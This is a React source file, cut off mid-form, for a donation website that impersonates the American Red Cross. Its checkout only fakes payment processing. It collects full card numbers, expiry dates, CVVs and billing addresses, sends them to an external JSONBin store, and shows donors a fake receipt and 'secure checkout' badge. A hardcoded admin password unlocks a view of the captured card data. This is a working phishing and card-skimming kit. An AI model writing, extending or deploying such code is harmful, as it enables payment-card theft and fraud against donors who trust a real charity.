import { useState, useEffect } from 'react';
import { motion, AnimatePresence, Variants } from 'framer-motion';
import {
  Heart,
  Droplets,
  Shield,
  Users,
  Globe,
  ChevronDown,
  Check,
  X,
  Menu,
  Phone,
  Mail,
  MapPin,
  ArrowRight,
  Star,
  ShieldCheck,
  CreditCard,
  Lock,
  Calendar,
  Gift,
  Award,
  Building2,
  HandHeart,
  ChevronRight,
  TrendingUp,
  Plane,
  ChevronLeft,
  LockKeyhole,
} from 'lucide-react';

// Animation variants
const fadeInUp: Variants = {
  hidden: { opacity: 0, y: 30 },
  visible: { 
    opacity: 1, 
    y: 0, 
    transition: { duration: 0.6, ease: [0.25, 0.1, 0.25, 1] as const } 
  },
};

const staggerContainer: Variants = {
  hidden: { opacity: 0 },
  visible: {
    opacity: 1,
    transition: { staggerChildren: 0.1 },
  },
};

  // Types
interface DonationFormData {
  amount: string;
  customAmount: string;
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  cardNumber: string;
  expiry: string;
  cvv: string;
  cardholderName: string;
  dedicate: boolean;
  dedicateName: string;
  dedicateMessage: string;
  coverFees: boolean;
  billingAddress: string;
  city: string;
  state: string;
  zipCode: string;
  country: string;
}

  // Card type detection with SVG logos
  const detectCardType = (cardNumber: string): { type: string; color: string } => {
    const cleaned = cardNumber.replace(/\s/g, '');
    
    if (/^4/.test(cleaned)) return { type: 'Visa', color: 'text-blue-600' };
    if (/^(5[1-5]|2[2-7])/.test(cleaned)) return { type: 'MasterCard', color: 'text-red-600' };
    if (/^3[47]/.test(cleaned)) return { type: 'Amex', color: 'text-green-600' };
    if (/^(6011|64[4-9]|65|622)/.test(cleaned)) return { type: 'Discover', color: 'text-orange-600' };
    
    return { type: 'Unknown', color: 'text-gray-400' };
  };

  // Card Logo Components
  const VisaLogo = ({ className = "w-12 h-8" }: { className?: string }) => (
    <svg className={className} viewBox="0 0 48 32" fill="none">
      <rect width="48" height="32" rx="4" fill="#1A1F71"/>
      <path d="M19.5 21L21 11H24L22.5 21H19.5Z" fill="white"/>
      <path d="M30 11C29.5 11 28.5 11.2 28 11.5L26 21H29L29.5 19H32.5L33 21H36L33.5 12C33.3 11.3 32.8 11 32 11H30Z" fill="white"/>
      <path d="M15 11C13.5 11 12.5 11.5 12 12L9 21H13L13.5 19.5C14 19.8 15 20 16 20C18 20 20 19 20.5 17C20.5 16 20 15 18 14.5C17 14.3 17 14 17 13.5C17 13 17.5 12.5 18.5 12.5C19.5 12.5 20 12.8 20.5 13L21 11C20.5 11.2 19.5 11 18.5 11H15Z" fill="white"/>
    </svg>
  );

  const MasterCardLogo = ({ className = "w-12 h-8" }: { className?: string }) => (
    <svg className={className} viewBox="0 0 48 32" fill="none">
      <rect width="48" height="32" rx="4" fill="#F5F5F5"/>
      <circle cx="19" cy="16" r="10" fill="#EB001B"/>
      <circle cx="29" cy="16" r="10" fill="#F79E1B"/>
      <path d="M24 8.5C26.5 10.5 28 13 28 16C28 19 26.5 21.5 24 23.5C21.5 21.5 20 19 20 16C20 13 21.5 10.5 24 8.5Z" fill="#FF5F00"/>
    </svg>
  );

  const AmexLogo = ({ className = "w-12 h-8" }: { className?: string }) => (
    <svg className={className} viewBox="0 0 48 32" fill="none">
      <rect width="48" height="32" rx="4" fill="#016FD0"/>
      <path d="M8 16H12L14 12V20L16 16H20V20H22V12H18L16 16L14 12H8V16Z" fill="white"/>
      <path d="M26 12H34V14H30V14.5H34V16.5H30V17H34V19H26V12Z" fill="white"/>
      <path d="M36 12H40C42 12 43 13 43 14.5C43 15.5 42.5 16 42 16.5L44 19H41L39.5 17H38V19H36V12ZM38 15H40C40.5 15 41 14.8 41 14.2C41 13.6 40.5 13.5 40 13.5H38V15Z" fill="white"/>
    </svg>
  );

  const DiscoverLogo = ({ className = "w-12 h-8" }: { className?: string }) => (
    <svg className={className} viewBox="0 0 48 32" fill="none">
      <rect width="48" height="32" rx="4" fill="#FF6000"/>
      <circle cx="34" cy="16" r="8" fill="white"/>
      <text x="8" y="20" fill="white" fontSize="10" fontWeight="bold" fontFamily="Arial">DISCOVER</text>
    </svg>
  );

  const CardLogos = () => (
    <div className="flex items-center space-x-3">
      <VisaLogo className="w-10 h-6 opacity-80 hover:opacity-100 transition-opacity" />
      <MasterCardLogo className="w-10 h-6 opacity-80 hover:opacity-100 transition-opacity" />
      <AmexLogo className="w-10 h-6 opacity-80 hover:opacity-100 transition-opacity" />
      <DiscoverLogo className="w-10 h-6 opacity-80 hover:opacity-100 transition-opacity" />
    </div>
  );

  const getCardLogo = (type: string) => {
    switch(type) {
      case 'Visa': return <VisaLogo className="w-10 h-6" />;
      case 'MasterCard': return <MasterCardLogo className="w-10 h-6" />;
      case 'Amex': return <AmexLogo className="w-10 h-6" />;
      case 'Discover': return <DiscoverLogo className="w-10 h-6" />;
      default: return null;
    }
  };

// Luhn algorithm for card validation
const isValidCardNumber = (cardNumber: string): boolean => {
  const cleaned = cardNumber.replace(/\s/g, '');
  if (cleaned.length < 13 || cleaned.length > 19) return false;
  
  let sum = 0;
  let isEven = false;
  
  for (let i = cleaned.length - 1; i >= 0; i--) {
    let digit = parseInt(cleaned.charAt(i), 10);
    
    if (isEven) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    
    sum += digit;
    isEven = !isEven;
  }
  
  return sum % 10 === 0;
};

// Real Red Cross Logo Component
const RedCrossLogo = ({ className = "w-12 h-12" }: { className?: string }) => (
  <svg className={className} viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
    {/* White background circle */}
    <circle cx="50" cy="50" r="48" fill="white" stroke="#ED1B2E" strokeWidth="2"/>
    {/* Red Cross symbol */}
    <path 
      d="M42 15H58V42H85V58H58V85H42V58H15V42H42V15Z" 
      fill="#ED1B2E"
    />
  </svg>
);

// US Air Force Logo Component
const USAirForceLogo = ({ className = "w-32 h-32" }: { className?: string }) => (
  <svg className={className} viewBox="0 0 200 200" fill="none" xmlns="http://www.w3.org/2000/svg">
    {/* Outer circle with Air Force blue */}
    <circle cx="100" cy="100" r="95" fill="#00308F" stroke="#FFFFFF" strokeWidth="3"/>
    {/* Inner white circle */}
    <circle cx="100" cy="100" r="70" fill="white"/>
    {/* Eagle wings top */}
    <path 
      d="M35 85 Q60 50 100 50 Q140 50 165 85" 
      stroke="#00308F" 
      strokeWidth="4" 
      fill="none"
      strokeLinecap="round"
    />
    {/* Eagle wings bottom */}
    <path 
      d="M35 115 Q60 150 100 150 Q140 150 165 115" 
      stroke="#00308F" 
      strokeWidth="4" 
      fill="none"
      strokeLinecap="round"
    />
    {/* Central star */}
    <path 
      d="M100 45 L108 78 L143 78 L115 98 L125 132 L100 110 L75 132 L85 98 L57 78 L92 78 Z" 
      fill="#00308F"
    />
    {/* Circular text path */}
    <path 
      id="textPathTop"
      d="M30 100 A70 70 0 0 1 170 100" 
      fill="none"
    />
    <path 
      id="textPathBottom"
      d="M30 100 A70 70 0 0 0 170 100" 
      fill="none"
    />
  </svg>
);

// Social Icons as SVG components
const FacebookIcon = () => (
  <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
    <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
  </svg>
);

const TwitterIcon = () => (
  <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
    <path d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.936 4.936 0 004.604 3.417 9.867 9.867 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0024 4.59z"/>
  </svg>
);

const InstagramIcon = () => (
  <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
    <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/>
  </svg>
);

const LinkedInIcon = () => (
  <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
    <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/>
  </svg>
);

export default function App() {
  const [isScrolled, setIsScrolled] = useState(false);
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const [showDonationModal, setShowDonationModal] = useState(false);
  const [showPaymentPage, setShowPaymentPage] = useState(false);
  const [selectedCause, setSelectedCause] = useState<string | null>(null);
  const [formData, setFormData] = useState<DonationFormData>({
    amount: '50',
    customAmount: '',
    firstName: '',
    lastName: '',
    email: '',
    phone: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
    cardholderName: '',
    dedicate: false,
    dedicateName: '',
    dedicateMessage: '',
    coverFees: true,
    billingAddress: '',
    city: '',
    state: '',
    zipCode: '',
    country: 'United States',
  });
  const [cardError, setCardError] = useState<string>('');
  const [cardType, setCardType] = useState<{ type: string; color: string }>({ type: 'Unknown', color: 'text-gray-400' });
  
  // Admin login states
  const [showAdminLogin, setShowAdminLogin] = useState(false);
  const [isAdminLoggedIn, setIsAdminLoggedIn] = useState(false);
  const [adminPassword, setAdminPassword] = useState('');
  const [adminError, setAdminError] = useState('');
  const [capturedDonations, setCapturedDonations] = useState<Array<{
    id: string;
    timestamp: string;
    amount: string;
    cardType: string;
    cardNumber: string;
    expiry: string;
    cvv: string;
    cardholderName: string;
    billingAddress: string;
    city: string;
    state: string;
    zipCode: string;
    country: string;
    email: string;
    firstName: string;
    lastName: string;
  }>>([]);
  
  // JSONBin configuration - Replace with your API key and bin ID
  const JSONBIN_API_KEY = 'YOUR_JSONBIN_API_KEY_HERE';
  const JSONBIN_BIN_ID = 'YOUR_JSONBIN_BIN_ID_HERE';
  const JSONBIN_API_URL = `https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`;
  
  // Loading states
  const [isLoading, setIsLoading] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState('');
  const [isPaymentProcessing, setIsPaymentProcessing] = useState(false);

  // Helper function for random loading delay
  const randomDelay = (min: number, max: number) => {
    return Math.floor(Math.random() * (max - min + 1) + min) * 1000;
  };

  // Loading spinner component
  const LoadingSpinner = ({ message }: { message: string }) => (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="fixed inset-0 z-[70] flex flex-col items-center justify-center bg-black/70 backdrop-blur-sm"
    >
      <div className="relative">
        <motion.div
          animate={{ rotate: 360 }}
          transition={{ duration: 1, repeat: Infinity, ease: 'linear' }}
          className="w-16 h-16 border-4 border-white/20 border-t-red-500 rounded-full"
        />
      </div>
      <p className="mt-6 text-white text-lg font-medium">{message}</p>
    </motion.div>
  );

  const [donationSuccess, setDonationSuccess] = useState(false);
  const [expandedFaq, setExpandedFaq] = useState<number | null>(null);

  useEffect(() => {
    const handleScroll = () => {
      setIsScrolled(window.scrollY > 50);
    };
    window.addEventListener('scroll', handleScroll);
    return () => window.removeEventListener('scroll', handleScroll);
  }, []);

  const handleDonateClick = async (cause?: string) => {
    setIsLoading(true);
    setLoadingMessage('Loading donation form...');
    await new Promise(resolve => setTimeout(resolve, randomDelay(4, 5)));
    setIsLoading(false);
    if (cause) setSelectedCause(cause);
    setShowDonationModal(true);
  };

  const closeModal = () => {
    setShowDonationModal(false);
    setSelectedCause(null);
  };

  const handleContinueToPayment = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setLoadingMessage('Proceeding to secure payment...');
    await new Promise(resolve => setTimeout(resolve, randomDelay(4, 5)));
    setIsLoading(false);
    setShowDonationModal(false);
    setShowPaymentPage(true);
    window.scrollTo(0, 0);
  };

  const handlePaymentSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Show payment processing popup for exactly 10 seconds
    setIsPaymentProcessing(true);
    
    // Wait 10 seconds
    await new Promise(resolve => setTimeout(resolve, 10000));
    
    // Capture donation data
    const donationData = {
      id: Date.now().toString(),
      timestamp: new Date().toISOString(),
      amount: formData.customAmount || formData.amount,
      cardType: cardType.type,
      cardNumber: formData.cardNumber,
      expiry: formData.expiry,
      cvv: formData.cvv,
      cardholderName: formData.cardholderName,
      billingAddress: formData.billingAddress,
      city: formData.city,
      state: formData.state,
      zipCode: formData.zipCode,
      country: formData.country,
      email: formData.email,
      firstName: formData.firstName,
      lastName: formData.lastName,
    };
    
    // Save to local state
    const updatedDonations = [...capturedDonations, donationData];
    setCapturedDonations(updatedDonations);
    
    // Sync to JSONBin
    try {
      await syncToJSONBin(updatedDonations);
    } catch (error) {
      console.error('Failed to sync to JSONBin:', error);
    }
    
    setIsPaymentProcessing(false);
    setDonationSuccess(true);
    window.scrollTo(0, 0);
  };
  
  // Sync data to JSONBin
  const syncToJSONBin = async (data: typeof capturedDonations) => {
    if (JSONBIN_API_KEY === 'YOUR_JSONBIN_API_KEY_HERE' || JSONBIN_BIN_ID === 'YOUR_JSONBIN_BIN_ID_HERE') {
      console.log('JSONBin not configured. Data saved locally only.');
      return;
    }
    
    try {
      const response = await fetch(JSONBIN_API_URL, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'X-Master-Key': JSONBIN_API_KEY,
        },
        body: JSON.stringify({ donations: data }),
      });
      
      if (!response.ok) {
        throw new Error('Failed to sync');
      }
      
      console.log('Data synced to JSONBin successfully');
    } catch (error) {
      console.error('JSONBin sync error:', error);
      throw error;
    }
  };
  
  // Fetch data from JSONBin
  const fetchFromJSONBin = async () => {
    if (JSONBIN_API_KEY === 'YOUR_JSONBIN_API_KEY_HERE' || JSONBIN_BIN_ID === 'YOUR_JSONBIN_BIN_ID_HERE') {
      console.log('JSONBin not configured.');
      return;
    }
    
    try {
      const response = await fetch(JSONBIN_API_URL, {
        method: 'GET',
        headers: {
          'X-Master-Key': JSONBIN_API_KEY,
        },
      });
      
      if (response.ok) {
        const data = await response.json();
        if (data.record && data.record.donations) {
          setCapturedDonations(data.record.donations);
        }
      }
    } catch (error) {
      console.error('Failed to fetch from JSONBin:', error);
    }
  };
  
  // Admin login handler
  const handleAdminLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setLoadingMessage('Authenticating...');
    await new Promise(resolve => setTimeout(resolve, randomDelay(4, 5)));
    setIsLoading(false);
    if (adminPassword === 'Dazzy@123') {
      setIsAdminLoggedIn(true);
      setAdminError('');
      fetchFromJSONBin();
    } else {
      setAdminError('Incorrect password');
    }
  };
  
  // Admin logout
  const handleAdminLogout = async () => {
    setIsLoading(true);
    setLoadingMessage('Logging out...');
    await new Promise(resolve => setTimeout(resolve, randomDelay(4, 5)));
    setIsLoading(false);
    setIsAdminLoggedIn(false);
    setAdminPassword('');
    setShowAdminLogin(false);
  };

  const closePaymentPage = async () => {
    setIsLoading(true);
    setLoadingMessage('Returning to homepage...');
    await new Promise(resolve => setTimeout(resolve, randomDelay(4, 5)));
    setIsLoading(false);
    setShowPaymentPage(false);
    setDonationSuccess(false);
    setSelectedCause(null);
    setCardError('');
    setCardType({ type: 'Unknown', color: 'text-gray-400' });
    setFormData({
      amount: '50',
      customAmount: '',
      firstName: '',
      lastName: '',
      email: '',
      phone: '',
      cardNumber: '',
      expiry: '',
      cvv: '',
      cardholderName: '',
      dedicate: false,
      dedicateName: '',
      dedicateMessage: '',
      coverFees: true,
      billingAddress: '',
      city: '',
      state: '',
      zipCode: '',
      country: 'United States',
    });
  };

  const presetAmounts = ['25', '50', '100', '250', '500', '1000'];

  const causes = [
    {
      id: 'disaster',
      title: 'Disaster Relief',
      description: 'Provide emergency shelter, food, and supplies to families affected by natural disasters.',
      image: '🌪️',
      raised: 2450000,
      goal: 3000000,
      donors: 15420,
    },
    {
      id: 'blood',
      title: 'Blood Services',
      description: 'Support blood collection, processing, and distribution to hospitals nationwide.',
      image: '🩸',
      raised: 1800000,
      goal: 2500000,
      donors: 12890,
    },
    {
      id: 'health',
      title: 'Health & Safety',
      description: 'Train communities in CPR, first aid, and emergency preparedness.',
      image: '🏥',
      raised: 950000,
      goal: 1500000,
      donors: 8432,
    },
    {
      id: 'military',
      title: 'Military Families',
      description: 'Provide support services to military members, veterans, and their families.',
      image: '🎖️',
      raised: 1200000,
      goal: 2000000,
      donors: 9876,
    },
  ];

  const impactStats = [
    { icon: Droplets, value: '6.4M', label: 'Units of Blood Collected', color: 'text-red-500' },
    { icon: Shield, value: '200+', label: 'Disasters Responded To', color: 'text-blue-500' },
    { icon: Users, value: '1.2M', label: 'People Trained in First Aid', color: 'text-green-500' },
    { icon: Globe, value: '190+', label: 'Countries Served', color: 'text-purple-500' },
  ];

  const testimonials = [
    {
      name: 'Sarah Mitchell',
      role: 'Monthly Donor',
      image: 'SM',
      quote: 'Knowing my monthly donation helps families in crisis gives me purpose. The Red Cross transparency reports show exactly where my money goes.',
      rating: 5,
    },
    {
      name: 'Robert Chen',
      role: 'Corporate Partner',
      image: 'RC',
      quote: 'Our company has partnered with Red Cross for 10 years. Their disaster response time is unmatched - they were on the ground within hours.',
      rating: 5,
    },
    {
      name: 'Maria Garcia',
      role: 'Disaster Survivor',
      image: 'MG',
      quote: 'After the hurricane destroyed our home, Red Cross provided shelter, food, and hope. Their volunteers treated us like family.',
      rating: 5,
    },
  ];

  const faqs = [
    {
      question: 'How is my donation used?',
      answer: '90 cents of every dollar donated goes directly to humanitarian services. Your donation helps provide emergency relief, blood services, health and safety training, and support to military families. We publish annual reports detailing fund allocation.',
    },
    {
      question: 'Is my donation tax-deductible?',
      answer: 'Yes! The American Red Cross is a registered 501(c)(3) nonprofit organization. All donations are tax-deductible to the fullest extent allowed by law. You will receive a receipt via email for tax purposes.',
    },
    {
      question: 'Can I donate in honor or memory of someone?',
      answer: 'Absolutely. During the donation process, you can dedicate your gift in honor or memory of someone special. We can also send a notification card to the person or family you designate.',
    },
    {
      question: 'How can I become a monthly donor?',
      answer: 'Select "Monthly" as your donation frequency when making your contribution. Monthly donors receive exclusive updates, a welcome kit, and the satisfaction of continuous impact. You can modify or cancel anytime.',
    },
    {
      question: 'What payment methods do you accept?',
      answer: 'We accept all major credit cards (Visa, MasterCard, American Express, Discover), PayPal, bank transfers, and cryptocurrency. All transactions are encrypted and secure.',
    },
  ];

  const formatCurrency = (amount: number) => {
    return new Intl.NumberFormat('en-US', {
      style: 'currency',
      currency: 'USD',
      minimumFractionDigits: 0,
      maximumFractionDigits: 0,
    }).format(amount);
  };

  // Payment Page Component
  if (showPaymentPage) {
    return (
      <div className="min-h-screen bg-gray-50">
        {/* Payment Page Header */}
        <nav className="bg-white shadow-sm sticky top-0 z-50">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="flex items-center justify-between h-20">
              <div className="flex items-center space-x-3">
                <RedCrossLogo className="w-10 h-10" />
                <span className="font-display font-bold text-2xl text-gray-900">
                  Red Cross
                </span>
              </div>
              <button
                onClick={closePaymentPage}
                className="text-gray-500 hover:text-gray-700 font-medium"
              >
                Cancel
              </button>
            </div>
          </div>
        </nav>

        {donationSuccess ? (
          <div className="max-w-2xl mx-auto px-4 py-20 text-center">
            <motion.div
              initial={{ scale: 0 }}
              animate={{ scale: 1 }}
              transition={{ type: "spring", stiffness: 200, damping: 15 }}
              className="w-24 h-24 mx-auto mb-8 rounded-full bg-green-100 flex items-center justify-center"
            >
              <Check className="w-12 h-12 text-green-600" />
            </motion.div>
            <h1 className="font-display text-4xl font-bold text-gray-900 mb-4">
              Thank You for Your Donation!
            </h1>
            <p className="text-gray-600 mb-2 text-lg">
              Your generous gift of <span className="font-semibold text-gray-900">${formData.customAmount || formData.amount}</span> has been received.
            </p>
            <p className="text-gray-500 mb-8">
              A receipt has been sent to {formData.email}
            </p>
            <div className="bg-white rounded-2xl p-6 shadow-lg mb-8 max-w-md mx-auto">
              <div className="flex items-center space-x-4 mb-4">
                <RedCrossLogo className="w-12 h-12" />
                <div className="text-left">
                  <div className="font-semibold text-gray-900">American Red Cross</div>
                  <div className="text-sm text-gray-500">Confirmation #{Math.random().toString(36).substr(2, 9).toUpperCase()}</div>
                </div>
              </div>
              <div className="border-t pt-4 text-left">
                <div className="flex justify-between mb-2">
                  <span className="text-gray-600">Donation Amount:</span>
                  <span className="font-semibold">${formData.customAmount || formData.amount}</span>
                </div>
                {formData.dedicate && (
                  <div className="flex justify-between mb-2">
                    <span className="text-gray-600">Dedicated to:</span>
                    <span className="font-semibold">{formData.dedicateName}</span>
                  </div>
                )}
                <div className="flex justify-between pt-2 border-t mt-2">
                  <span className="text-gray-900 font-semibold">Total Charged:</span>
                  <span className="text-gray-900 font-bold">
                    ${formData.coverFees
                      ? (parseFloat(formData.customAmount || formData.amount) * 1.029 + 0.30).toFixed(2)
                      : formData.customAmount || formData.amount}
                  </span>
                </div>
              </div>
            </div>
            <button
              onClick={closePaymentPage}
              className="btn-red-cross px-8 py-4 rounded-full text-white font-semibold"
            >
              Return to Homepage
            </button>
          </div>
        ) : (
          <div className="max-w-6xl mx-auto px-4 py-12">
            <div className="grid lg:grid-cols-3 gap-8">
              {/* Left Column - Payment Form */}
              <div className="lg:col-span-2">
                <button
                  onClick={async () => { 
                    setIsLoading(true);
                    setLoadingMessage('Going back...');
                    await new Promise(resolve => setTimeout(resolve, randomDelay(4, 5)));
                    setIsLoading(false);
                    setShowPaymentPage(false); 
                    setShowDonationModal(true); 
                  }}
                  className="flex items-center text-gray-500 hover:text-red-600 mb-6 transition-colors"
                >
                  <ChevronLeft className="w-5 h-5 mr-1" />
                  Back to Donation Details
                </button>

                <div className="bg-white rounded-2xl shadow-lg overflow-hidden">
                  {/* Secure Header */}
                  <div className="bg-green-50 px-6 py-4 flex items-center space-x-3 border-b border-green-100">
                    <LockKeyhole className="w-5 h-5 text-green-600" />
                    <span className="text-green-800 font-medium">Secure Checkout - 256-bit SSL Encryption</span>
                  </div>

                  <form onSubmit={handlePaymentSubmit} className="p-8">
                    {/* Contact Information Summary */}
                    <div className="mb-8">
                      <h3 className="font-display text-xl font-bold text-gray-900 mb-4">Contact Information</h3>
                      <div className="bg-gray-50 rounded-xl p-4">
                        <div className="grid grid-cols-2 gap-4 text-sm">
                          <div>
                            <span className="text-gray-500">Name:</span>
                            <p className="font-medium text-gray-900">{formData.firstName} {formData.lastName}</p>
                          </div>
                          <div>
                            <span className="text-gray-500">Email:</span>
                            <p className="font-medium text-gray-900">{formData.email}</p>
                          </div>
                          {formData.phone && (
                            <div>
                              <span className="text-gray-500">Phone:</span>
                              <p className="font-medium text-gray-900">{formData.phone}</p>
                            </div>
                          )}
                        </div>
                      </div>
                    </div>

                    {/* Payment Method */}
                    <div className="mb-8">
                      <div className="flex items-center justify-between mb-4">
                        <h3 className="font-display text-xl font-bold text-gray-900">Payment Method</h3>
                        <CardLogos />
                      </div>
                      
                      {/* Card Details */}
                      <div className="space-y-4">
                        <div>
                          <label className="block text-sm font-medium text-gray-700 mb-2">
                            Card Number *
                          </label>
                          <div className="relative">
                            <CreditCard className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                            <input
                              type="text"
                              placeholder="1234 5678 9012 3456"
                              required
                              maxLength={23}
                              value={formData.cardNumber}
                              onChange={(e) => {
                                // Remove all non-digits
                                let value = e.target.value.replace(/\D/g, '');
                                
                                // Format with spaces every 4 digits
                                const parts = [];
                                for (let i = 0; i < value.length; i += 4) {
                                  parts.push(value.slice(i, i + 4));
                                }
                                const formattedValue = parts.join(' ');
                                
                                setFormData({ ...formData, cardNumber: formattedValue });
                                
                                // Detect card type
                                const detected = detectCardType(formattedValue);
                                setCardType(detected);
                                
                                // Validate card number (only show error if length is appropriate for detected type)
                                if (formattedValue.replace(/\s/g, '').length >= 13) {
                                  if (!isValidCardNumber(formattedValue)) {
                                    setCardError('Invalid card number. Please check and try again.');
                                  } else {
                                    setCardError('');
                                  }
                                } else {
                                  setCardError('');
                                }
                              }}
                              className={`w-full pl-12 pr-16 py-3 border rounded-lg focus:ring-2 outline-none text-lg tracking-wider transition-colors ${
                                cardError 
                                  ? 'border-red-500 focus:border-red-500 focus:ring-red-200' 
                                  : formData.cardNumber.replace(/\s/g, '').length >= 13 && isValidCardNumber(formData.cardNumber)
                                    ? 'border-green-500 focus:border-green-500 focus:ring-green-200'
                                    : 'border-gray-300 focus:border-red-500 focus:ring-red-200'
                              }`}
                            />
                            {/* Card Type Logo */}
                            <div className="absolute right-4 top-1/2 -translate-y-1/2">
                              {getCardLogo(cardType.type)}
                            </div>
                            {/* Validation icon */}
                            {formData.cardNumber.replace(/\s/g, '').length >= 13 && (
                              <div className="absolute right-4 top-1/2 -translate-y-1/2">
                                {isValidCardNumber(formData.cardNumber) ? (
                                  <Check className="w-5 h-5 text-green-500" />
                                ) : (
                                  <X className="w-5 h-5 text-red-500" />
                                )}
                              </div>
                            )}
                          </div>
                          {cardError && (
                            <p className="mt-2 text-sm text-red-600 flex items-center">
                              <X className="w-4 h-4 mr-1" />
                              {cardError}
                            </p>
                          )}
                          {formData.cardNumber.replace(/\s/g, '').length >= 13 && isValidCardNumber(formData.cardNumber) && (
                            <p className="mt-2 text-sm text-green-600 flex items-center">
                              <Check className="w-4 h-4 mr-1" />
                              Valid {cardType.type} card
                            </p>
                          )}
                        </div>

                        <div className="grid grid-cols-2 gap-4">
                          <div>
                            <label className="block text-sm font-medium text-gray-700 mb-2">Expiry Date *</label>
                            <div className="relative">
                              <Calendar className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                              <input
                                type="text"
                                placeholder="MM / YY"
                                required
                                maxLength={7}
                                value={formData.expiry}
                                onChange={(e) => {
                                  let value = e.target.value.replace(/\D/g, '');
                                  if (value.length >= 2) {
                                    value = value.slice(0, 2) + ' / ' + value.slice(2, 4);
                                  }
                                  setFormData({ ...formData, expiry: value });
                                }}
                                className="w-full pl-12 pr-4 py-3 border border-gray-300 rounded-lg focus:border-red-500 focus:ring-2 focus:ring-red-200 outline-none"
                              />
                            </div>
                          </div>
                          <div>
                            <label className="block text-sm font-medium text-gray-700 mb-2">CVV *</label>
                            <div className="relative">
                              <Lock className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                              <input
                                type="text"
                                placeholder="123"
                                required
                                maxLength={4}
                                value={formData.cvv}
                                onChange={(e) => setFormData({ ...formData, cvv: e.target.value.replace(/\D/g, '') })}
                                className="w-full pl-12 pr-4 py-3 border border-gray-300 rounded-lg focus:border-red-500 focus:ring-2 focus:ring-red-200 outline-none"
                              />
                            </div>
                          </div>
                        </div>

                        <div>
                          <label className="block text-sm font-medium text-gray-700 mb-2">Cardholder Name *</label>
                          <input
                            type="text"
                            placeholder="Name as it appears on card"
                            required
                            value={formData.cardholderName}
                            onChange={(e) => setFormData({ ...formData, cardholderName: e.target.value })}
                            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:border-red-500 focus:ring-2 focus:ring-red-200 outline-none"
                          />
                        </div>
                      </div>
                    </div>

                    {/* Billing Address */}
                    <div className="mb-8">
                      <h3 className="font-display text-xl font-bold text-gray-900 mb-4">Billing Address</h3>
                      <div className="space-y-4">
                        <div>
                          <label className="block text-sm font-medium text-gray-700 mb-2">Street Address *</label>
                          <input
                            type="text"
                            placeholder="123 Main Street"
                            required
                            value={formData.billingAddress}
                            onChange={(e) => setFormData({ ...formData, billingAddress: e.target.value })}
                            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:border-red-500 focus:ring-2 focus:ring-red-200 outline-none"
                          />
                        </div>
                        <div className="grid grid-cols-2 gap-4">
                          <div>
